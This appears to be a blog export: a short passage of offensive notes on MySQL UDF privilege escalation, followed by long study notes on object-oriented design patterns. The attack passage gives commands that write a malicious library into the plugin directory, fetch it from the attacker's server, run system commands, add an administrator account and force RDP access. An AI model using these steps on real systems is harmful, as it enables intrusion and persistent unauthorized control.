123MySQL数据库没有开启安全模式。已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。shell有写入到数据库安装目录的权限。 12345678udf.dll 如何处理1、cmd命令行处理certutil -encodehex -f -v udf64.dll w32x.txt 4 2、数据库处理select hex(load_file('/udf/udf64.so')) into dumpfile 'l64.hex';3、远程包含导入select load_file('//你的服务器/l64.so') into dumpfile '/www/server/mysql/lib/plugin/l64.so'; 步骤： 12345671.select @@version_compile_os,@@version_compile_machine,@@version #判断版本2.select @@plugin_dir ; show variables like 'plugin%';#判断路径3.select 0x3weqwe.. into dumpfile '/www/server/mysql/lib/plugin/1.so'#写入文件4.drop function sys_evalcreate function sys_eval returns string soname '1.so';#生成函数5.select sys_eval('whoami') #执行函数 注意：outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式 宝塔(可以短时间让电脑变成服务器，并增加安全防护)管理数据库：要知道端口-&gt;路径-&gt;登录进入管理网站-&gt;登录数据库-&gt;管理数据库phpmyadmin：http://IP:888/pma 补丁查询 0.当遇到连执行命令的权限都没有的时候，直接上传一个新的cmd.exe 1.执行systeminfo命令查询目标服务器打过哪些补丁，将执行结果复制放到查询网站-&gt;返回exp 2.找到哪些是可以利用的，得到system权限 3.创建用户 123net user qiesi abc123 /add #添加用户，默认普通用户没有登录远程服务器的权限net user qiesi /delete #删除用户net localgroup administrators qiesi /add #将用户加入到管理员组 4.远程登录：在本地输入mstsc 找ip:在目标服务器命令行输入ping 目标网址(要删去http头) 在远程桌面连接输入ip或ip:3389 /admin 3389：有的时候远程连接的默认端口不是3389 /admin：有时遇到目标服务器连接不上，超出了最大允许连接范围-&gt;把别人挤掉 总结 参考资料1.udf提权","link":"/2022/04/18/%E6%9C%A8%E9%A9%AC%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"设计模式","text":"摘要：设计模式-可复用面向对象软件的基础 学习笔记 前言12345678910面向对象：继承、封装、多态客户请求是对象执行操作的唯一方法，操作又是对象改变内部封装数据的唯一方法型构：某个操作的操作名、作为参数的对象、返回值接口：所有型构的集合(注意：两个有相同接口的对象可能有不同实现)类型：某对象接收window的接口的所有请求，则其具有window类型子类型&lt;-&gt;超类型动态绑定：发给对象的请求和它的相应操作 在运行时的连接多态：允许你在运行时彼此替换有相同接口的对象抽象类：为了让子类可以有相同的接口和不同的实现。用户只需要知道抽象类混入类；给其他类提供可选择的接口的类，要求多继承 1.类型与类；类继承与接口继承一个对象可以有多个类型，但只属于一个类。不同类的对象可以有相同的类型 类继承根据一个对象的实现定义了另一个对象的实现，是代码和表示的共享机制(即这两个对象一定有关系)。接口继承描述了一个对象何时能被用来替代另一个对象(除了接口同可能其他完全不同) C++接口继承的方法是公有继承一个含(纯)虚成员函数的类 2.公有继承/私有继承/保护继承的区别1.公有继承–public 派生类的新增成员可以访问基类的公有成员和保护成员，但是访问不了基类的私有成员。派生类的对象只能访问派生类的公有成员（包括继承的公有成员），访问不了保护成员和私有成员。 2.保护继承–protected 基类的公有成员和保护成员被派生类继承后变成派生类的保护成员 3.私有继承–private 私有继承时，基类的公有成员和保护成员都被派生类继承下来之后变成派生类的私有成员为什么要有protected：public是对所有用户开放的，而protected成员是只开放给自己和子类的，其他没关系的类不能访问。 3.类继承与对象组合类继承和对象组合常一起使用，但设计者往往过度使用了继承。 4.委托有两个对象参与处理一个请求，接收请求的对象将操作委托给它的代理者，类似于子类把没重定义的请求交给它的父类处理。实现方法：在委托者类中保存一个代理者类的实例。 5.参数化类型/模板/类属123如实现元素比较操作的例程(元素类型不确定)：可实现要传给排序例程的对象的职责作为C++模板以指定元素类型 6.设计应支持变化一些导致重新设计的原理： 12345678显式指定一个类 来创建对象为请求指定了一个特殊的操作 完成请求的方式固定了对硬件和平台的依赖知道对象具体实现的客户在对象发生变化时也可能变化，所以要封装算法依赖(算法会经常优化)紧耦合：对互相依赖的类，你想改变或删除一个类，必须理解和改变其他很多类，难学习通过生成子类来扩充功能：对父类的理解，类爆炸不能方便地对类进行修改：没有源代码，影响其他很多类 7.怎么选择设计模式123456考虑设计模式怎么解决问题浏览设计模式的意图研究模式怎么关联研究目的相似的模式未来可能重新设计的原因设计中哪些是可变的 8.怎么使用设计模式1234567浏览模式适用性和效果研究结构部分、参与者部分和协作部分看代码示例选择模式参与者的名字定义类定义模式中专用于应用的操作名称实现执行模式中的责任与协作机制 一、创建型 - 设计模式1 简单工厂模式 简单工厂模式(Simple Factory Pattern)：专门定义一个类（工厂类）来负责创建其他类的实例。可以根据创建方法的参数来返回不同类的实例，被创建的实例通常都具有共同的父类。 举例：简单工厂模式像一个代工厂，一个工厂可以生产多种产品。举个例子，一个饮料加工厂同时帮百事可乐和可口可乐生产，加工厂根据输入参数Type来生产不同的产品。 优点： 使用者只需要给工厂类传入一个正确的约定好的参数，就可以获取你所需要的对象，而不需要知道其创建细节，一定程度上减少系统的耦合。 客户端无须知道所创建的具体产品类的类名，只需要知道具体产品类所对应的参数即可，减少开发者的记忆成本。 缺点： 如果业务上添加新产品的话，就需要修改工厂类原有的判断逻辑，这其实是违背了开闭原则的。 在产品类型较多时，有可能造成工厂逻辑过于复杂。所以简单工厂模式比较适合产品种类比较少而且增多的概率很低的情况。 2 工厂方法模式 工厂方法模式(Factory Method Pattern)又称为工厂模式，工厂父类负责定义创建产品对象的公共接口，而工厂子类则负责生成具体的产品对象，即通过不同的工厂子类来创建不同的产品对象。 举例：工厂方法和简单工厂有一些区别，简单工厂是由一个代工厂生产不同的产品，而工厂方法是对工厂进行抽象化，不同产品都由专门的具体工厂来生产。可口可乐工厂专门生产可口可乐，百事可乐工厂专门生产百事可乐。 优点： 用户只需要关心其所需产品对应的具体工厂是哪一个即可，不需要关心产品的创建细节，也不需要知道具体产品类的类名。 当系统中加入新产品时，不需要修改抽象工厂和抽象产品提供的接口，也无须修改客户端和其他的具体工厂和具体产品，而只要添加一个具体工厂和与其对应的具体产品就可以了，符合了开闭原则。 缺点： 当系统中加入新产品时，除了需要提供新的产品类之外，还要提供与其对应的具体工厂类。因此系统中类的个数将成对增加，增加了系统的复杂度。 3 抽象工厂模式 抽象工厂模式(Abstract Factory Pattern)：提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。 举例：抽象工厂和工厂方法不同的地方在于，工厂模式只能生产单一产品不能生产产品族，而现实生活中往往需要产品族。 举例，可口可乐公司生产可乐的同时，也需要生产装可乐的瓶子和箱子，瓶子和箱子也是可口可乐专属定制的，同样百事可乐公司也会有这个需求。这个时候我们的工厂不仅仅是生产可乐饮料的工厂，还必须同时生产同一主题的瓶子和箱子，所以它是一个抽象的主题工厂，专门生产同一主题的不同商品。 优点： 具体产品在应用层代码隔离，不需要关心产品细节。只需要知道自己需要的产品是属于哪个工厂的即可 当一个产品族中的多个对象被设计成一起工作时，它能够保证客户端始终只使用同一个产品族中的对象。这对一些需要根据当前环境来决定其行为的软件系统来说，是一种非常实用的设计模式。 缺点： 产品线写死了。规定了所有可能被创建的产品集合，产品族中扩展新的产品困难，需要修改抽象工厂的接口。 4 单例模式 单例模式(Singleton Pattern)：单例模式确保某一个类只有一个实例，并提供一个访问它的全局访问点。(多个对象指针指向的是同一个) 构造方法： 构造函数私有化(构造函数只执行一次) 提供一个全局的静态方法(全局访问点) 在类中定义一个静态指针，指向本类的变量的静态变量指针 分类： 懒汉式；只有在get实例时才把实例new出来 举例： 在多个线程之间，比如初始化一次socket资源，比如servlet环境，共享同一个资源或者操作同一个对象 在整个程序空间中使用全局变量，共享资源 大规模系统中，为了性能考虑，需要节省对象的创建时间 单例模式下，对应类只能生成一个实例。就像一个王国只能有一个国王，一旦王国里的事务多起来，这唯一的国王也容易职责过重。 优点： 提供了对唯一实例的受控访问。因为单例类封装了它的唯一实例，所以它可以严格控制客户怎样以及何时访问它。 因为该类在系统内存中只存在一个对象，所以可以节约系统资源。 缺点： 由于单例模式中没有抽象层，因此单例类很难进行扩展。 对于有垃圾回收系统的语言 Java，C# 来说，如果对象长时间不被利用，则可能会被回收。那么如果这个单例持有一些数据的话，在回收后重新实例化时就不复存在了。 5 生成器模式 生成器模式(Builder Pattern)：也叫创建者模式，它将一个复杂对象的构建过程与它的表示分离，使得同样的构建过程可以创建不同的表示。 举例：生成器模式将复杂的创建逻辑进行分割，例如生产汽车，分步骤创建安装不同的零件。但如果创建逻辑简单则没有拆分的必要。 1234Builder:创建各个部分，抽象接口ConcreteBuilder:具体创建Director:一个使用Builder接口的对象Product:被构造的复杂对象 优点： 客户端不必知道产品内部组成的细节，使得相同的创建过程可以创建不同的产品对象。用户使用不同的具体建造者即可得到不同的产品对象。 每一个具体建造者都相对独立，与其他的具体建造者无关，因此可以很方便地替换具体建造者或增加新的具体建造者。工程队竞争上岗、擅长的地方不同(造别墅、平房等)，便于比较不同建造者的性能。 增加新的具体建造者无须修改原有类库的代码，指挥者类针对抽象建造者类编程，系统扩展方便，符合“开闭原则”。 可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程。 缺点： 建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。 如果产品的内部变化复杂，可能会导致需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大。6 原型模式 原型模式（Prototype Pattern）: 使用原型实例指定待创建对象的类型，并且通过复制这个原型来创建新的对象。即提供一个接口，让创建复杂的类具有自我复制功能 举例：原型模式就像复印技术，根据原对象复印出一个新对象，并根据需求对新对象进行微调。 深拷贝与浅拷贝 优点： 可以利用原型模式简化对象的创建过程，尤其是对一些创建过程繁琐，包含对象层级比较多的对象来说，使用原型模式可以节约系统资源，提高对象生成的效率。 可以很方便得通过改变值来生成新的对象：有些对象之间的差别可能只在于某些值的不同；用原型模式可以快速复制出新的对象并手动修改值即可。 缺点： 对象包含的所有对象都需要配备一个克隆的方法，这就使得在对象层级比较多的情况下，代码量会很大，也更加复杂。 二、结构型 - 设计模式总原则：让类和类进行组合从而获取更大的结构 1.代理模式 代理模式(Proxy Pattern)：代理类a包含被代理类b的实例，a,b类实现协议类protocol 举例：代理模式像一个房屋中介，买家只能通过中介来买房，代理具备被代理类的所有功能，就像房东有卖房功能，中介也具有卖房功能。此外代理实例还可以帮助被代理实例进行一些额外处理(淘宝网代理卖家)，比如中介可以帮助房东筛选优质买家的功能，帮助房东pass掉一些不符合条件的买家。还有消息队列也是该模式。 优点： 降低系统的耦合度：代理模式能够协调调用者和被调用者，在一定程度上降低了系统的耦合度。 不同类型的代理可以对客户端对目标对象的访问进行不同的控制： 远程代理,使得客户端可以访问在远程机器上的对象，远程机器可能具有更好的计算性能与处理速度，可以快速响应并处理客户端请求。 虚拟代理通过使用一个小对象来代表一个大对象，可以减少系统资源的消耗，对系统进行优化并提高运行速度。 保护代理可以控制客户端对真实对象的使用权限。 缺点： 由于在客户端和被代理对象之间增加了代理对象，因此可能会让客户端请求的速度变慢。2.装饰模式 装饰模式(Decorator Pattern):不改变原有对象的前提下，动态地给一个对象增加一些额外的功能。比生成子类更灵活，比如可以+a功能，+c,也可以+a+c,即额外装饰已经装饰好的对象 举例：装饰模式贴合开闭原则，在不改变原有类的情况下，对父类进行改造或新增功能。举例，定一个抽象类Tea，只能提供白开水，但是通过装饰类BlackTea装饰之后拓展了新功能，通过BlackTea类可以用白开水泡红茶，还可以选择加柠檬。 优点： 比继承更加灵活：不同于在编译期起作用的继承；装饰者模式可以在运行时扩展一个对象的功能。另外也可以通过配置文件在运行时选择不同的装饰器，从而实现不同的行为。也可以通过不同的组合，可以实现不同效果。 符合“开闭原则”：装饰者和被装饰者可以独立变化。用户可以根据需要增加新的装饰类，在使用时再对其进行组合，原有代码无须改变。 缺点： 装饰者模式需要创建一些具体装饰类，会增加系统的复杂度。 3.适配器模式 适配器模式(Adapter Pattern) ：将一个接口转换成客户希望的另一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。别名是包装器模式（Wrapper） 举例：适配器模式顾名思义，比如内地用像港版插头需要一个转接头。再比如iPhone的手机卡是特别小的 Nano 卡，把 Nano 卡拿到其他手机上不能贴合卡槽尺寸，所以我们需要加一个符合卡槽尺寸的卡套。 优点： 符合开闭原则：使用适配器而不需要改变现有类，提高类的复用性。 目标类和适配器类解耦，提高程序扩展性。 缺点： 增加了系统的复杂性 4.桥接模式 桥接模式(Simple Factory Pattern)：将抽象部分与它的实现部分分离(解耦合),使它们都可以独立地变化。如发动机类不在车类里实现 举例：尽管手机都有各自的不同之处，但是他们都有一个手机卡卡槽，卡槽里可以插不同运营商的卡。不管手机和卡内部如何改变，只要卡槽的行业标准没有变，就都可以正常使用。桥接模式在于将复杂的类进行分割，优先对象组合的方式，就像将手机里的手机卡抽离出去新建一个类，实现手机实例持有一个手机卡实例的组合方式。而不是通过继承来新建多个不同手机卡的手机子类。 优点： 扩展性好，符合开闭原则：将抽象与实现分离，让二者可以独立变化 缺点： 在设计之前，需要识别出两个独立变化的维度。 5.组合模式 适用于：单个对象和组合对象的使用具有一致性，将对象组合成树形结构，以表示部分-整体(文件夹与文件) 单个对象和组合对象的接口一致，但实现可能不一致（如返回NULL） 6.外观模式 外观模式(Facade Pattern)：外观模式定义了一个高层接口，为子系统中的一组接口提供一个统一的接口。外观模式又称为门面模式。 举例：外观模式提供了简单明确的接口，但是在内部众多子系统功能进行整合。就像图片缓存，内部包含了涉及到其他子系统的如缓存、下载等处理，外观模式将这些复杂的逻辑都隐藏了。在UIImageView和UIButton调用的时候，你只需要调一个setImageWithUrl:(NSString *)url接口就可以了，达到解耦合的目的。 优点： 实现了客户端与子系统间的解耦：客户端无需知道子系统的接口，简化了客户端调用子系统的调用过程，使得子系统使用起来更加容易。同时便于子系统的扩展和维护。 符合迪米特法则（最少知道原则）：子系统只需要将需要外部调用的接口暴露给外观类即可，而且他的接口则可以隐藏起来。 缺点： 违背了开闭原则：在不引入抽象外观类的情况下，增加新的子系统可能需要修改外观类或客户端的代码。 7.享元模式 享元模式(Flyweight Pattern)：运用共享技术复用大量细粒度的对象(比如某个对象要使用千次，避免重复创建),降低程序内存的占用,提高程序的性能。(相同id的Teacher) 举例：例如 UITableViewCell 的缓存机制，达到降低内存消耗的目的。举例，音乐服务根据收费划分出免费用户和会员用户，免费用户只能听部分免费音乐，会员用户可以听全部的音乐，并且可以下载。虽然权限上二者间有一些区别，但是他们所享受的音乐来是自于同一个音乐库，这样所有的音乐都只需要保存一份就可以了。另外如果出现音乐库里没有的音乐时，则需要新增该音乐，然后其他服务也可以享受新增的音乐，相当于享元池或缓存池的功能。 优点： 使用享元模可以减少内存中对象的数量，使得相同对象或相似对象在内存中只保存一份，降低系统的使用内存，也可以提性能。 享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。 缺点： 使用享元模式需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。 对象在缓冲池中的复用需要考虑线程问题。 六、行为型 - 设计模式总原则：描述类或对象怎么交互和分配职责，侧重类的方法 1.模板方法模式 模板方法模式：把方法的实现放到子类，但在抽象类中提前定义好方法的调用顺序逻辑作为模板 举例：模板方法模式在 iOS 中的应用也非常多，如 UIViewController 的生命周期函数，定义在父类，子类可以重写这些函数。 模板方法模式具体应用又分为三类： 抽象方法：一个抽象方法由抽象类声明、由其具体子类实现。 具体方法：一个具体方法由一个抽象类或具体类声明并实现，其子类可以进行覆盖也可以直接继承 钩子方法：一个钩子方法由一个抽象类或具体类声明并实现，而其子类可能会加以扩展。通常在父类中给出的实现是一个空实现，并以该空实现作为方法的默认实现，当然钩子方法也可以提供一个非空的默认实现。通过在子类中实现的钩子方法对父类方法的执行进行约束，实现子类对父类行为的反向控制。 优点： 在父类中形式化地定义一个算法，而由它的子类来实现细节的处理，在子类实现详细的处理算法时并不会改变算法中步骤的执行次序。 模板方法模式是一种代码复用技术，它在类库设计中尤为重要，它提取了类库中的公共行为，将公共行为放在父类中，而通过其子类来实现不同的行为，它鼓励我们恰当使用继承来实现代码复用。 可实现一种反向控制结构，通过子类覆盖父类的钩子方法来决定某一特定步骤是否需要执行。 在模板方法模式中可以通过子类来覆盖父类的基本方法，不同的子类可以提供基本方法的不同实现，更换和增加新的子类很方便，符合单一职责原则和开闭原则。 缺点： 需要为每一个基本方法的不同实现提供一个子类，如果父类中可变的基本方法太多，将会导致类的个数增加，系统更加庞大，设计也更加抽象，此时，可结合桥接模式来进行设计。2.命令模式 命令模式(Command Pattern)：别名为动作(Action)或事务(Transaction)模式。一个对象(Car)调用另一个对象(Engine)的过程是：创建目标对象实例；设置调用参数；调用目标对象的方法。如果调用过程较繁琐，或者有多处调用，有必要用一个专门的类对这种调用过程进行封装，即command类 把一个请求封装成一个类，从而可用不同的请求对客户进行参数化，可对请求排队、归类、记录日志、撤销等。(如护士收集归类病历并对病人排队) 举例：例如遥控器是一个调用者，不同按钮代表不同的命令，而电视是接收者。如日志、缓存、记录历史操作等 优点： 降低系统的耦合度。由于请求者与接收者之间不存在直接引用，因此请求者与接收者之间实现完全解耦，相同的请求者可以对应不同的接收者，同样，相同的接收者也可以供不同的请求者使用，两者之间具有良好的独立性。 新的命令可以很容易地加入到系统中。由于增加新的具体命令类不会影响到其他类，因此增加新的具体命令类很容易，无须修改原有系统源代码，甚至客户类代码，满足“开闭原则”的要求。 可以比较容易地设计一个命令队列或宏命令（组合命令）。 为请求的撤销(Undo)和恢复(Redo)操作提供了一种设计和实现方案。 缺点： 使用命令模式可能会导致某些系统有过多的具体命令类。因为针对每一个对请求接收者的调用操作都需要设计一个具体命令类，因此在某些系统中可能需要提供大量的具体命令类，这将影响命令模式的使用。3.职责链模式 职责链模式(Chain of Responsibility Pattern)：避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。 举例：职责链模式在 iOS 中有大量的应用，比如事件响应链，事件传递下来会先判断该事件是不是应该由自己处理，如果不是由自己处理则传给下一位响应者去处理，如此循环下去。需要注意的是要避免响应链循环调用造成死循环，还有当所有的响应者都无法处理时的情况。 优点： 职责链模式使得一个对象无须知道是其他哪一个对象处理其请求，对象仅需知道该请求会被处理即可，接收者和发送者都没有对方的明确信息，且链中的对象不需要知道链的结构，由客户端负责链的创建，降低了系统的耦合度。 请求处理对象仅需维持一个指向其后继者的引用，而不需要维持它对所有的候选处理者的引用，可简化对象的相互连接。 在给对象分派职责时，职责链可以给我们更多的灵活性，可以通过在运行时对该链进行动态的增加或修改来增加或改变处理一个请求的职责。 在系统中增加一个新的具体请求处理者时无须修改原有系统的代码，只需要在客户端重新建链即可，从这一点来看是符合“开闭原则”的。 缺点： 由于一个请求没有明确的接收者，那么就不能保证它一定会被处理，该请求可能一直到链的末端都得不到处理；一个请求也可能因职责链没有被正确配置而得不到处理。 对于比较长的职责链，请求的处理可能涉及到多个处理对象，系统性能将受到一定影响，而且在进行代码调试时不太方便。 如果建链不当，可能会造成循环调用，将导致系统陷入死循环。 4.策略模式 策略模式(Strategy Pattern)：定义一系列算法类，将每一个算法封装起来，并让它们可以相互替换，策略模式让算法独立于使用它的客户而变化，也称为政策模式(Policy)。 举例：使用策略模式时，我们可以定义一些策略类，每一个策略类中封装一种具体的算法。在这里，每一个封装算法的类我们都可以称之为一种策略，根据传入不同的策略类，使环境类执行不同策略类中的算法。 生活中也有很多类似的例子，就比如说商城的会员卡机制。我们去商城购物可以通过持有的会员卡打折，购买同一件商品时，持有不同等级的会员卡，能得到不同力度的折扣。下面的例子中我列举了青铜、白银、黄金三种 Vip 会员卡，传入不同的会员卡最终需要支付的金额也会有所不同。 优点： 策略模式提供了对“开闭原则”的完美支持，用户可以在不修改原有系统的基础上选择算法或行为，也可以灵活地增加新的算法或行为。 策略模式提供了管理相关的算法族的办法。策略类的等级结构定义了一个算法或行为族，恰当使用继承可以把公共的代码移到抽象策略类中，从而避免重复的代码。 策略模式提供了一种可以替换继承关系的办法。如果不使用策略模式，那么使用算法的环境类就可能会有一些子类，每一个子类提供一种不同的算法。但是，这样一来算法的使用就和算法本身混在一起，不符合“单一职责原则”，决定使用哪一种算法的逻辑和该算法本身混合在一起，从而不可能再独立演化；而且使用继承无法实现算法或行为在程序运行时的动态切换。 使用策略模式可以避免多重条件选择语句。多重条件选择语句不易维护，它把采取哪一种算法或行为的逻辑与算法或行为本身的实现逻辑混合在一起，将它们全部硬编码(Hard Coding)在一个庞大的多重条件选择语句中，比直接继承环境类的办法还要原始和落后。 策略模式提供了一种算法的复用机制，由于将算法单独提取出来封装在策略类中，因此不同的环境类可以方便地复用这些策略类。 缺点： 客户端必须知道所有的策略类，并自行决定使用哪一个策略类。这就意味着客户端必须理解这些算法的区别，以便适时选择恰当的算法。换言之，策略模式只适用于客户端知道所有的算法或行为的情况。 策略模式将造成系统产生很多具体策略类，任何细小的变化都将导致系统要增加一个新的具体策略类。 无法同时在客户端使用多个策略类，也就是说，在使用策略模式时，客户端每次只能使用一个策略类，不支持使用一个策略类完成部分功能后再使用另一个策略类来完成剩余功能的情况。 5.中介者模式 中介者模式(Mediator Pattern)：用一个中介对象（中介者）来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。中介者模式又称为调停者模式 举例：中介者模式将一个网状的系统结构变成一个以中介者对象为中心的星形结构，在这个星型结构中，使用中介者对象与其他对象的一对多关系来取代原有对象之间的多对多关系。所有成员通过中介者交互，方便拓展新的成员，例如下面的例子，新增一个聊天室成员只需要新建一个成员实例，然后再在聊天室中介者那注册就可以加入聊天室了。 优点： 中介者模式简化了对象之间的交互，它用中介者和同事的一对多交互代替了原来同事之间的多对多交互，一对多关系更容易理解、维护和扩展，将原本难以理解的网状结构转换成相对简单的星型结构。 中介者模式可将各同事对象解耦。中介者有利于各同事之间的松耦合，我们可以独立的改变和复用每一个同事和中介者，增加新的中介者和新的同事类都比较方便，更好地符合“开闭原则”。 可以减少子类生成，中介者将原本分布于多个对象间的行为集中在一起，改变这些行为只需生成新的中介者子类即可，这使各个同事类可被重用，无须对同事类进行扩展。 缺点： 在具体中介者类中包含了大量同事之间的交互细节，可能会导致具体中介者类非常复杂，使得系统难以维护。 6.观察者模式 观察者模式(Observer Pattern)：定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象皆得到通知并被自动更新。观察者模式的别名包括发布-订阅（Publish/Subscribe）模式、模型-视图（Model/View）模式、源-监听器（Source/Listener）模式或从属者（Dependents）模式。 举例：观察者模式是使用频率最高的设计模式之一，它用于建立一种对象与对象之间的依赖关系，一个对象发生改变时将自动通知其他对象，其他对象将相应作出反应。 优点： 观察者模式可以实现表示层和数据逻辑层的分离，定义了稳定的消息更新传递机制，并抽象了更新接口，使得可以有各种各样不同的表示层充当具体观察者角色。 观察者模式在观察目标和观察者之间建立一个抽象的耦合。观察目标只需要维持一个抽象观察者的集合，无须了解其具体观察者。由于观察目标和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。 观察者模式支持广播通信，观察目标会向所有已注册的观察者对象发送通知，简化了一对多系统设计的难度。 观察者模式满足“开闭原则”的要求，增加新的具体观察者无须修改原有系统代码，在具体观察者与观察目标之间不存在关联关系的情况下，增加新的观察目标也很方便。 缺点： 如果一个观察目标对象有很多直接和间接观察者，将所有的观察者都通知到会花费很多时间。 如果在观察者和观察目标之间存在循环依赖，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。 观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。 7.备忘录模式 备忘录模式(Memento Pattern)：在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。别名为Token。 举例：备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原，当前很多软件都提供了撤销操作，其中就使用了备忘录模式。 我们用一个简单的游戏存档来举例，这也是备忘录模式的一种应用。 优点： 它提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原。 备忘录实现了对信息的封装，一个备忘录对象是一种原发器对象状态的表示，不会被其他代码所改动。备忘录保存了原发器的状态，采用列表、堆栈等集合来存储备忘录对象可以实现多次撤销操作。 缺点： 资源消耗过大，如果需要保存的原发器类的成员变量太多，就不可避免需要占用大量的存储空间，每保存一次对象的状态都需要消耗一定的系统资源。 8.访问者模式 访问者模式(Visitor Pattern):解耦合对象的数据和操作，提供一个作用于某对象中的各元素的操作表示，它使我们可以在不改变各元素的类的前提下定义作用于这些元素的新操作。 举例：访问者模式是一种较为复杂的行为型设计模式，它包含访问者和被访问元素两个主要组成部分，这些被访问的元素通常具有不同的类型，且不同的访问者可以对它们进行不同的访问操作。访问者模式使得用户可以在不修改现有系统的情况下扩展系统的功能，为这些不同类型的元素增加新的操作。 在使用访问者模式时，被访问元素通常不是单独存在的，它们存储在一个集合中，这个集合被称为「对象结构」，访问者通过遍历对象结构实现对其中存储的元素的逐个操作。通过一个简单的例子了解访问者模式，访问者有财务部门FADepartment和 HR 部门HRDepartment，通过访问雇员Employee来查看雇员的工作情况。 优点： 增加新的访问操作很方便。使用访问者模式，增加新的访问操作就意味着增加一个新的具体访问者类，实现简单，无须修改源代码，符合“开闭原则”。 将有关元素对象的访问行为集中到一个访问者对象中，而不是分散在一个个的元素类中。类的职责更加清晰，有利于对象结构中元素对象的复用，相同的对象结构可以供多个不同的访问者访问。 让用户能够在不修改现有元素类层次结构的情况下，定义作用于该层次结构的操作。 缺点： 增加新的元素类很困难。在访问者模式中，每增加一个新的元素类都意味着要在抽象访问者角色中增加一个新的抽象操作，并在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”的要求。 破坏封装。访问者模式要求访问者对象访问并调用每一个元素对象的操作，这意味着元素对象有时候必须暴露一些自己的内部操作和内部状态，否则无法供访问者访问。9.状态模式 状态模式(State Pattern)：通过用户的状态来改变对象的行为。别名为状态对象(Objects for States)。 举例：状态模式用于解决复杂对象的状态转换以及不同状态下行为的封装问题。当系统中某个对象存在多个状态，这些状态之间可以进行转换，所以对象在不同状态下具有不同行为时可以使用状态模式。状态模式将一个对象的状态从该对象中分离出来，封装到专门的状态类中，使得对象状态可以灵活变化。 我们可以做一个简单的例子，我设计了一个银行账户系统，根据存钱余额来自动设置账户的状态，银行账户在不同状态下，进行存钱、取钱和借钱的行为。在不同状态下，这些行为得到的回复也不一样，比如说没有余额时无法取钱，只能借钱。 优点： 封装了状态的转换规则，在状态模式中可以将状态的转换代码封装在环境类或者具体状态类中，可以对状态转换代码进行集中管理，而不是分散在一个个业务方法中。 将所有与某个状态有关的行为放到一个类中，只需要注入一个不同的状态对象即可使环境对象拥有不同的行为。 允许状态转换逻辑与状态对象合成一体，而不是提供一个巨大的条件语句块，状态模式可以让我们避免使用庞大的条件语句来将业务方法和状态转换代码交织在一起。 可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。 缺点： 状态模式的使用必然会增加系统中类和对象的个数，导致系统运行开销增大。 状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱，增加系统设计的难度。 状态模式对“开闭原则”的支持并不太好，增加新的状态类需要修改那些负责状态转换的源代码，否则无法转换到新增状态；而且修改某个状态类的行为也需修改对应类的源代码。 10.解释器模式 解释器模式(Interpreter Pattern)：定义一个语言的文法，并且建立一个解释器来解释该语言中的句子，这里的“语言”是指使用规定格式和语法的代码。 context:保存输入和输出解释器:根据输入算出输出，并返回到context举例：说到解释器模式，我们的编译器，在对代码进行编译的时候也用到了该模式。我们可以直接来做一个简单的解释器，一个给机器人下发指令的解释器。 命令 参数 direction 移动方向 ‘up’ ‘down’ ‘left’ ‘right’ action 移动方式 ‘move’ ‘run’ distance 移动距离 an integer 表达式终结符号 ‘;’ 通过建立一个映射关系可以很快将指令转换成行为，例如up run 5; 表示向上跑5米，而left move 12; 表示向左移动12米。 优点： 易于改变和扩展文法。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。 每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。 实现文法较为容易。在抽象语法树中每一个表达式节点类的实现方式都是相似的，这些类的代码编写都不会特别复杂，还可以通过一些工具自动生成节点类代码。 增加新的解释表达式较为方便。如果用户需要增加新的解释表达式只需要对应增加一个新的终结符表达式或非终结符表达式类，原有表达式类代码无须修改，符合“开闭原则”。 缺点： 对于复杂文法难以维护。在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，类的个数将会急剧增加，导致系统难以管理和维护，此时可以考虑使用语法分析程序等方式来取代解释器模式。 执行效率较低。由于在解释器模式中使用了大量的循环和递归调用，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。 11.迭代器模式 迭代器模式(Iterator Pattern)：提供一种方法来访问聚合对象，而不用暴露这个对象的内部表示，其别名为游标(Cursor)。迭代器模式是一种对象行为型模式。 举例：迭代器帮助请求方获取数据，避免直接操作数据聚合类，使数据聚合类专注存储数据。具体应用有分页等功能，分页功能的迭代器将专门负责操作分页数据，将操作逻辑和数据源分离。 优点： 它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。 